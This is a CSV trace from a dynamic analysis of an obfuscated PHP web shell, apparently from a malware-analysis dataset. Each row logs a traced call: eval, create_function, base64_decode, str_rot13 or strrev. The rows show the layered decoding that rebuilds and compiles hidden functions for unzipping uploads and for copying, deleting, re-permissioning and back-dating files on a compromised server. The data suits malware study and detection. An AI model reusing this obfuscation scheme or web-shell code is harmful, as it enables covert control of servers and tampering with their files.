uuid,file_md5,index,source,target,argc,argv,return,dynamic
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,749,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){class zip\r\n{\r\n\r\n var $total_files = 0;\r\n var $total_folders = 0; \r\n\r\n function Extract ( $zn, $to, $index = Array(-1) )\r\n {\r\n   $ok = 0; $zip = @fopen($zn,'rb');\r\n   if(!$zip) return(-1);\r\n   $cdir = $this->ReadCentralDir($zip,$zn);\r\n   $pos_entry = $cdir['offset'];\r\n\r\n   if(!is_array($index)){ $index = array($index);  }\r\n   for($i=0; $index[$i];$i++){\r\n   \t\tif(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])\r\n\t\treturn(-1);\r\n   }\r\n   for ($i=0; $i<$cdir['entries']; $i++)\r\n   {\r\n     @fseek($zip, $pos_entry);\r\n     $header = $this->ReadCentralFileHeaders($zip);\r\n     $header['index'] = $i; $pos_entry = ftell($zip);\r\n     @rewind($zip); fseek($zip, $header['offset']);\r\n     if(in_array(\""-1\"",$index)||in_array($i,$index))\r\n     \t$stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);\r\n   }\r\n   fclose($zip);\r\n   return $stat;\r\n }\r\n\r\n  function ReadFileHeader($zip)\r\n  {\r\n    $binary_data = fread($zip, 30);\r\n    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);\r\n\r\n    $header['filename'] = fread($zip, $data['filename_len']);\r\n    if ($data['extra_len'] != 0) {\r\n      $header['extra'] = fread($zip, $data['extra_len']);\r\n    } else { $header['extra'] = ''; }\r\n\r\n    $header['compression'] = $data['compression'];$header['size'] = $data['size'];\r\n    $header['compressed_size'] = $data['compressed_size'];\r\n    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];\r\n    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];\r\n\r\n    if ($header['mdate'] && $header['mtime']){\r\n     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;\r\n     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;\r\n     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;\r\n     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);\r\n    }else{$header['mtime'] = time();}\r\n\r\n    $header['stored_filename'] = $header['filename'];\r\n    $header['status'] = \""ok\"";\r\n    return $header;\r\n  }\r\n\r\n function ReadCentralFileHeaders($zip){\r\n    $binary_data = fread($zip, 46);\r\n    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);\r\n\r\n    if ($header['filename_len'] != 0)\r\n      $header['filename'] = fread($zip,$header['filename_len']);\r\n    else $header['filename'] = '';\r\n\r\n    if ($header['extra_len'] != 0)\r\n      $header['extra'] = fread($zip, $header['extra_len']);\r\n    else $header['extra'] = '';\r\n\r\n    if ($header['comment_len'] != 0)\r\n      $header['comment'] = fread($zip, $header['comment_len']);\r\n    else $header['comment'] = '';\r\n\r\n    if ($header['mdate'] && $header['mtime'])\r\n    {\r\n      $hour = ($header['mtime'] & 0xF800) >> 11;\r\n      $minute = ($header['mtime'] & 0x07E0) >> 5;\r\n      $seconde = ($header['mtime'] & 0x001F)*2;\r\n      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;\r\n      $month = ($header['mdate'] & 0x01E0) >> 5;\r\n      $day = $header['mdate'] & 0x001F;\r\n      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);\r\n    } else {\r\n      $header['mtime'] = time();\r\n    }\r\n    $header['stored_filename'] = $header['filename'];\r\n    $header['status'] = 'ok';\r\n    if (substr($header['filename'], -1) == '/')\r\n      $header['external'] = 0x41FF0010;\r\n    return $header;\r\n }\r\n\r\n function ReadCentralDir($zip,$zip_name){\r\n\t$size = filesize($zip_name);\r\n\r\n\tif ($size < 277) $maximum_size = $size;\r\n\telse $maximum_size=277;\r\n\t\r\n\t@fseek($zip, $size-$maximum_size);\r\n\t$pos = ftell($zip); $bytes = 0x00000000;\r\n\t\r\n\twhile ($pos < $size){\r\n\t\t$byte = @fread($zip, 1); $bytes=($bytes << 8) | ord($byte);\r\n\t\tif ($bytes == 0x504b0506 or $bytes == 0x2e706870504b0506){ $pos++;break;} $pos++;\r\n\t}\r\n\t\r\n\t$fdata=fread($zip,18);\r\n\t\r\n\t$data=@unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',$fdata);\r\n\t\r\n\tif ($data['comment_size'] != 0) $centd['comm""]]}",{"value": "003E"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,750,nodgqa,__lambda_func,0,{"value": []},{"value": "void"},[]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,751,eval,nodgqa,2,"{""value"": [[0, ""UtrIng"", ""=0aPAfGXvL1q2xmXnqKMcWKJSuTpT9vnycTBMWwHepyr1LUpm40AKcKA2O3ZBqmI6IwqjAwG3ZRIFEaoIqIrAqUZ25zrGWQGYS0qjcKrdSKHwWzoYSRZiAmI1xyrkyTJDO""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,752,nodgqa,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,753,nodgqa,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,754,nodgqa,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,755,nodgqa,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,756,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,757,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,758,nodgqa,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,759,nodgqa,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,760,nodgqa,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,761,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,762,nodgqa,strrev,1,"{""value"": [[0, ""str"", ""=0aPAfGXvL1q2xmXnqKMcWKJSuTpT9vnycTBMWwHepyr1LUpm40AKcKA2O3ZBqmI6IwqjAwG3ZRIFEaoIqIrAqUZ25zrGWQGYS0qjcKrdSKHwWzoYSRZiAmI1xyrkyTJDO""]]}",{"value": "MaIhL3Eco24tp3EupaEsqJ56nKNbWUE0YPE0oKOsozSgMFjxozI3K25uoJHfWUEiMTylCFq6nKOznJkyWly7QDccMvtxqUD9CFpkWly7QDbtVPNtVPNtVPE6VQ0tozI3VS"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,763,nodgqa,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tp3EupaEsqJ56nKNbWUE0YPE0oKOsozSgMFjxozI3K25uoJHfWUEiMTylCFq6nKOznJkyWly7QDccMvtxqUD9CFpkWly7QDbtVPNtVPNtVPE6VQ0tozI3VS""]]}",{"value": "ZnVuY3Rpb24gc3RhcnRfdW56aXAoJHR0LCR0bXBfbmFtZSwkbmV3X25hbWUsJHRvZGlyPSd6aXBmaWxlJyl7DQppZigkdHQ9PScxJyl7DQogICAgICAgICR6ID0gbmV3IF"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,764,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gc3RhcnRfdW56aXAoJHR0LCR0bXBfbmFtZSwkbmV3X25hbWUsJHRvZGlyPSd6aXBmaWxlJyl7DQppZigkdHQ9PScxJyl7DQogICAgICAgICR6ID0gbmV3IF""]]}","{""value"": ""function start_unzip($tt,$tmp_name,$new_name,$todir='zipfile'){\r\nif($tt=='1'){\r\n        $z = new Zip;\r\n\t\t$have_zip_file=0;\r\n\t\t$upf""}",[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,765,nodgqa,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function start_unzip($tt,$tmp_name,$new_name,$todir='zipfile'){\r\nif($tt=='1'){\r\n        $z = new Zip;\r\n\t\t$have_zip_file=0;\r\n\t\t$upf""]]}",{"value": "\\x00lambda_45"},"[0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,766,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function start_unzip($tt,$tmp_name,$new_name,$todir='zipfile'){\r\nif($tt=='1'){\r\n        $z = new Zip;\r\n\t\t$have_zip_file=0;\r\n\t\t$upfile = array(\""tmp_name\""=>$tmp_name,\""name\""=>$new_name);\r\n\t\tif(is_file($upfile[tmp_name])){\r\n\t\t\t$have_zip_file = 1;\r\n\t\t\techo JmCode(\""=NvB5Tg49dA19KgClWTC\"").$upfile[name].JmCode(\""=4wpvkwClWTC\"");\r\n\t\t\tif(preg_match('/\\.zip$/mis',$upfile[name])){\r\n\t\t\t\t$result=$z->Extract($upfile[tmp_name],$todir);\r\n\t\t\t\tif($result==-1){\r\n\t\t\t\t\techo JmCode(t4CiR7fClWTC).$upfile[name].JmCode(\""==tClWTChZimgGYV\"");\r\n\t\t\t\t}\r\n\t\t\t\techo JmCode(\""==NVvTZd9Xohfx8fd3fClWTC\"").$z->total_folders.JmCode(\""=jPiP/Yk2wYV\"").$z->total_files.JmCode(\""=4wpvkwClWTC+VaL84v/8Ffm2wYV\"");\r\n\t\t\t}else{\r\n\t\t\t\techo JmCode(\""==tClWTC\"").$upfile[name].JmCode(\""=4wpvkwClWTCh4CiR7ZVjyzrtpfl7XYV\"");\t\t\t\r\n\t\t\t}\r\n\t\t\tif(realpath($upfile[name])!=realpath($upfile[tmp_name])){\r\n\t\t\t\t@unlink($upfile[name]);\r\n\t\t\t\trename($upfile[tmp_name],$upfile[name]);\r\n\t\t\t}\r\n\t\t}\r\n}elseif($tt=='2'){\r\n$zip = new ZipArchive() ;\r\nif ($zip->open($tmp_name) !== TRUE) {\r\necho JmCode(\""=H7hjif87d6ilGYd36gm8Qo9Yao0uBXhUsnf\"");\r\n}\r\n$zip->extractTo($todir);\r\n$zip->close();\r\n}elseif($tt=='3'){\r\n$phar = new PharData($tmp_name);\r\n$phar->extractTo($todir, null, true);\r\n}\r\necho JmCode(\""==DCbEKLjMvocSJo9VKM25JLy9wV9LJMluTVukmBjAaLhMlBjAaLhMlBjAaLhMFbw+pfd3phEYri\"").urlencode($todir).JmCode(\""+R2Y8t9h1reCvfGXk0PXiqzY5W3o0AKnbcQqjyzpwAKL2Sznv0wMyWUntRTC7N3pv5zW7N3pv5zW7N3pv5zW+R2Y8jej/FphEYriewZ+96wV\"");\r\n}}""]]}",{"value": "003E"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,767,nodgqa,__lambda_func,0,{"value": []},{"value": "void"},[]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,768,eval,nodgqa,2,"{""value"": [[0, ""UtrIng"", ""9cDQ7xvVgWUMe1zn90wVbHTMiAHoX5lMm1TWhxvVf9FLSWTp3VInQEGCvtFMx92DgcRVhWKq0IzpWbDQ9ytPAfmXexTWWxtPA0KPWbDQ7fJLyWaLtfwpyMaocEvYcVPZOM""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,769,nodgqa,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,770,nodgqa,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,771,nodgqa,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,772,nodgqa,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,773,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,774,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,775,nodgqa,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,776,nodgqa,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,777,nodgqa,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,778,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,779,nodgqa,strrev,1,"{""value"": [[0, ""str"", ""9cDQ7xvVgWUMe1zn90wVbHTMiAHoX5lMm1TWhxvVf9FLSWTp3VInQEGCvtFMx92DgcRVhWKq0IzpWbDQ9ytPAfmXexTWWxtPA0KPWbDQ7fJLyWaLtfwpyMaocEvYcVPZOM""]]}",{"value": "MaIhL3Eco24tEzyfMI9OL3DbWTSlpzS5YPEuL3EuoTjfWTyhqzIlXD0Xrj0XPJyzXPtxL291oaDtCFOwo3IhqPtxLKWlLKxcXFN9CFNjXFOlMKE1pz4tFz1Qo2EyXPV9CK"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,780,nodgqa,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tEzyfMI9OL3DbWTSlpzS5YPEuL3EuoTjfWTyhqzIlXD0Xrj0XPJyzXPtxL291oaDtCFOwo3IhqPtxLKWlLKxcXFN9CFNjXFOlMKE1pz4tFz1Qo2EyXPV9CK""]]}",{"value": "ZnVuY3Rpb24gRmlsZV9BY3QoJGFycmF5LCRhY3RhbGwsJGludmVyKQ0Kew0KCWlmKCgkY291bnQgPSBjb3VudCgkYXJyYXkpKSA9PSAwKSByZXR1cm4gSm1Db2RlKCI9PX"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,781,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gRmlsZV9BY3QoJGFycmF5LCRhY3RhbGwsJGludmVyKQ0Kew0KCWlmKCgkY291bnQgPSBjb3VudCgkYXJyYXkpKSA9PSAwKSByZXR1cm4gSm1Db2RlKCI9PX""]]}","{""value"": ""function File_Act($array,$actall,$inver)\r\n{\r\n\tif(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\tif($actall ==""}",[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,782,nodgqa,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function File_Act($array,$actall,$inver)\r\n{\r\n\tif(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\tif($actall ==""]]}",{"value": "\\x00lambda_46"},"[0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,783,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function File_Act($array,$actall,$inver)\r\n{\r\n\tif(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\tif($actall == 'e')\r\n\t{\r\n     if(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\r\n     function listfiles($dir=\"".\"",$faisunZIP,$mydir){\r\n\t\t$sub_file_num = 0;\r\n\t\tif(is_file($mydir.\""$dir\"")){\r\n\t\t  if(realpath($faisunZIP ->gzfilename)!=realpath($mydir.\""$dir\"")){\r\n\t\t\t$faisunZIP -> addfile(file_get_contents($mydir.$dir),\""$dir\"");\r\n\t\t\treturn 1;\r\n\t\t  }\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t\t\r\n\t\t$handle=opendir($mydir.\""$dir\"");\r\n\t\twhile ($file = readdir($handle)) {\r\n\t\t   if($file==\"".\""||$file==\""..\"")continue;\r\n\t\t   if(is_dir($mydir.\""$dir/$file\"")){\r\n\t\t\t $sub_file_num += listfiles(\""$dir/$file\"",$faisunZIP,$mydir);\r\n\t\t   }\r\n\t\t   else {\r\n\t\t   \t   if(realpath($faisunZIP ->gzfilename)!=realpath($mydir.\""$dir/$file\"")){\r\n\t\t\t     $faisunZIP -> addfile(file_get_contents($mydir.$dir.\""/\"".$file),\""$dir/$file\"");\r\n\t\t\t\t $sub_file_num ++;\r\n\t\t\t\t}\r\n\t\t   }\r\n\t\t}\r\n\t\tclosedir($handle);\r\n\t\tif(!$sub_file_num) $faisunZIP -> addfile(\""\"",\""$dir/\"");\r\n\t\treturn $sub_file_num;\r\n\t}\r\n\r\n   function num_bitunit($num){\r\n\t  $bitunit=array(' B',' KB',' MB',' GB');\r\n\t  for($key=0;$key<count($bitunit);$key++){\r\n\t\tif($num>=pow(2,10*$key)-1){\r\n\t\t  $num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100).\"" $bitunit[$key]\"";\r\n\t\t}\r\n\t  }\r\n\t  return $num_bitunit_str;\r\n   }\r\n\r\n\t$mydir=$_GET['path'].'/';\r\n\t$inver=urldecode($inver);\r\n\tif(is_array($array)){\r\n\t\t$faisunZIP = new PHPzip;\r\n\t\tif($faisunZIP -> startfile(\""$inver\"")){\r\n\t\t\t$filenum = 0;\r\n\t\t\tforeach($array as $file){\r\n\t\t\t\t$filenum += listfiles($file,$faisunZIP,$mydir);\r\n\t\t\t}\r\n\t\t\t$faisunZIP -> createfile();\r\n\t\t\treturn JmCode(\""==NVGmo7ZYohfx8fd3p9Yao0\"").$filenum.JmCode(\""a0wMyWUntRTC+VaL84v/8Ffm2wYV\"").$inver.JmCode(\""=NP2HY8m3i7416mW\"").$inver.JmCode(\""=tPV\"").num_bitunit(filesize(\""$inver\"")).JmCode(\""=4GLijGX\"");\r\n\t\t}else{\r\n\t\t\treturn $inver.JmCode(\""+VaL84lgV3s1ks7kX79mbvf87nei3Xp6llBiesZYewZgDmAk7XYV\"");\r\n\t\t}\r\n\t}else{\r\n\t\treturn JmCode(\""==tClWTChjej/Ff876CiR7Zk1TC1uTA0Gi7j\"");\r\n    }\r\n\r\n\t}\r\n\t$i = 0;\r\n\twhile($i < $count)\r\n\t{\r\n\t\t$array[$i] = urldecode($array[$i]);\r\n\t\tswitch($actall)\r\n\t\t{\r\n\t\t\tcase \""a\"" : $inver = urldecode($inver); if(!is_dir($inver)) return JmCode(\""=ZimgGeg+rej\""); $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = JmCode(\""9JekJGYh\"").$inver.JmCode(\""==NiP/Yk\""); break;\r\n\t\t\tcase \""b\"" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = JmCode(\""==D/m6ol\""); break;\r\n\t\t\tcase \""c\"" : if(!eregi(\""^[0-7]{4}$\"",$inver)) return JmCode(\""==j8B3Bg1nA1DGil\""); $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = JmCode(\""==tdBGZhrQA1DGil\"").$inver; break;\r\n\t\t\tcase \""d\"" : @touch($array[$i],strtotime($inver)); $msg = JmCode(\""==tdBGBikdZk46A0\"").$inver; break;\r\n\t\t}\r\n\t\t$i++;\r\n\t}\r\n\treturn JmCode(\""=4CiR7pbEa/l\"").$msg.JmCode(\""==jmkdrm\"");\r\n}}""]]}",{"value": "003E"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,784,nodgqa,__lambda_func,0,{"value": []},{"value": "void"},[]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,785,eval,nodgqa,2,"{""value"": [[0, ""UtrIng"", ""=0aPAfGXcVlDIIHqZc3n5MIIkAJGIIxLQMRpecIHBy3If9xLAcHru5JIRymIguKZMqUp5qSoCM3ompSrAgxI5bSHCqKGXgzMjE1H41RI5uJGgOGLnOSp0kxZWM2oISxnZc""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,786,nodgqa,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,787,nodgqa,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,788,nodgqa,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,789,nodgqa,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,790,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,791,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,792,nodgqa,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,793,nodgqa,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,794,nodgqa,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,795,nodgqa,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,796,nodgqa,strrev,1,"{""value"": [[0, ""str"", ""=0aPAfGXcVlDIIHqZc3n5MIIkAJGIIxLQMRpecIHBy3If9xLAcHru5JIRymIguKZMqUp5qSoCM3ompSrAgxI5bSHCqKGXgzMjE1H41RI5uJGgOGLnOSp0kxZWM2oISxnZc""]]}",{"value": "MaIhL3Eco24tnUEgoS9gLJyhXPEjLKEbYPEmnTIfoT5uoJHcrj0XWUAypaMypzyjCJqyqTuip3EvrJ5uoJHbWS9GEIWJEIWoW1ASHyMSHy9BDH1SW10cBj0XnUEgoS9hXR"},[0]
ba95e040ea8498702ad837faf156aa54,7b33cde33f1edb63fe90f1ae677ca450,797,nodgqa,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tnUEgoS9gLJyhXPEjLKEbYPEmnTIfoT5uoJHcrj0XWUAypaMypzyjCJqyqTuip3EvrJ5uoJHbWS9GEIWJEIWoW1ASHyMSHy9BDH1SW10cBj0XnUEgoS9hXR""]]}",{"value": "ZnVuY3Rpb24gaHRtbF9tYWluKCRwYXRoLCRzaGVsbG5hbWUpew0KJHNlcnZlcmlwPWdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pOw0KaHRtbF9uKE"},[0]
